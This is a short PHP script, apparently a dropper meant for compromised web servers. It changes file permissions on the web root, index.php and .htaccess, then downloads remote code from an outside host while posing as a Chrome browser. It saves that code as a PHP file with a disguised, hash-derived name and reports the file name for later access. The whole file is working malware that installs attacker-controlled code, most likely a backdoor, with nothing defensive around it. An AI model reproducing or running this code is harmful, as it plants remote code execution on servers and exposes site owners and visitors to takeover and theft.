<?php

chmod(get_root_path(), 0755);
chmod(get_root_path().'/index.php', 0644);
chmod(get_root_path().'/.htaccess', 0644);
if (file_exists(get_root_path().'/index.php') && !is_writable(get_root_path().'/index.php') || file_exists(get_root_path().'/.htaccess') && !is_writable(get_root_path().'/.htaccess'))
{
	fail_reason('Index.php or .htaccess isn\'t writable');
}


if (version_compare(PHP_VERSION, '5.0.0', '<'))
{
	fail_reason('PHP 4');
}

$content = fetch_url('http://obf.bokoinchina.com/obf.php?file=coder');
if ($content === false)
{
	fail_reason('Fetching url failed');
}

$content = '<?php '.$content.' ?>';

$file_name = substr(md5($_SERVER['SERVER_ADDR'].'coder'), 0, 4).'.php';
if (!file_put_contents($file_name, $content))
{
	fail_reason('Can\'t save file');
}


fail_reason('Success!'.$file_name);

function get_root_path()
{
	$localpath=getenv("SCRIPT_NAME");$absolutepath=str_replace('\\', '/', getenv("SCRIPT_FILENAME"));$root_path=substr($absolutepath,0,strpos($absolutepath,$localpath));
	return $root_path;
}

function fail_reason($reason)
{
	//unlink(__FILE__);
	die($reason);
}

function fetch_url($url) 
{
    $user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36';
	$contents = false;
	$errs = 0;
	while (!$contents && ($errs++ < 3))
	{		
		if (extension_loaded('curl') && function_exists('curl_init')) {
			$c = curl_init($url);
			curl_setopt($c, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($c, CURLOPT_USERAGENT,$user_agent);
			$contents = curl_exec($c);
			curl_close($c);
		} else
		{
			$options  = array('http' => array('user_agent' => $user_agent));
			$context  = stream_context_create($options);
			$contents = @file_get_contents($url, false, $context);
		}
	}
    
    return $contents;
}